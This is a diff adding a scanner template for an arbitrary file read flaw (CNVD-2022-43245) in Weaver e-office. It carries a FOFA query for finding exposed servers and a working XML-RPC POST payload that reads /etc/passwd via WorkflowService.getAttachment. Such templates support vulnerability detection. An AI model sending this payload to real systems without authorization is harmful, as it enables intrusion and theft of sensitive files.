@@ -1,0 +1,27 @@
+id: CNVD-2022-43245
+
+info:
+  name: Weaver OA XmlRpcServlet - Arbitary File Read
+  author: SleepingBag945
+  severity: high
+  verified: true
+  description: |-
+    e-office is a standard collaborative mobile office platform. Ltd. e-office has an arbitrary file reading vulnerability, which can be exploited by attackers to obtain sensitive information.
+    FOFA: app="泛微-协同办公OA"
+  tags: cnvd,cnvd2022,weaver,e-office,oa,lfi
+  created: 2023/09/21
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet
+      headers:
+        Content-Type: application/xml
+      body: |
+        <?xml version="1.0" encoding="UTF-8"?><methodCall>
+        <methodName>WorkflowService.getAttachment</methodName>
+        <params><param><value><string>/etc/passwd</string>
+        </value></param></params></methodCall>
+    expression: response.status == 200 && response.body.bcontains(b"<methodResponse><params><param><value><base64>")
+expression: r0()
